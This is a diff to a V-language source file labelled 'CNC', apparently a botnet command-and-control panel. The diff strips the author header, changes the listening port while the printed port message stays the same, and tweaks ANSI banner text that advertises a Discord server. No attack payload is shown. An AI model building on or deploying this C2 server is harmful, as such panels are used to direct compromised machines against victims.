@@ -1,13 +1,6 @@
 import net
 import net.http
 
-/*
-@title: CNC
-@creator: eZy
-@since: 2/8/21
-@language: V
-*/
-
 const (
 	Red = '\x1b[31m'
 	Yellow = '\x1b[33m'
@@ -27,7 +20,7 @@ const (
 )
 
 pub fn main() {
-    mut sv := net.listen_tcp(1234) ?
+    mut sv := net.listen_tcp(345) ?
     println('Listening On Port 1234')
     for {
         mut conn := sv.accept() ?
@@ -69,14 +62,14 @@ fn login(u string, p string) (string) {
 
 fn motd() (string) {
 	mut motd_b := '$Red      ╔═════════════════════════════════════════════════════════════════╗\r\n'
-	motd_b += '      ║     $Cyan[MOTD]:$Red                                                     ║\r\n'
+	motd_b += '      ║    $Cyan [MOTD]: $Red                                                    ║\r\n'
 	motd_b += '      ╚═════════════════════════════════════════════════════════════════╝\r\n'
 	return motd_b
 }
 
 fn banner() (string) {
 	mut gay := ''
-	gay += '$Red                           $Cyan CodeTheWorld.xyz/discord$Red\r\n'
+	gay += '$Red                           $Cyan CodeTheWorld.xyz/discord $Red\r\n'
 	gay += '                       ╔═══════════════════════════════╗\r\n'
 	gay += '   ╔════════════╦══════╣          ╔═╗╔╦╗╦ ╦            ╠══════╦════════════╗\r\n'
 	gay += '   ║    eZy     ║      ║          ║   ║ ║║║            ║      ║    Draco   ║\r\n'
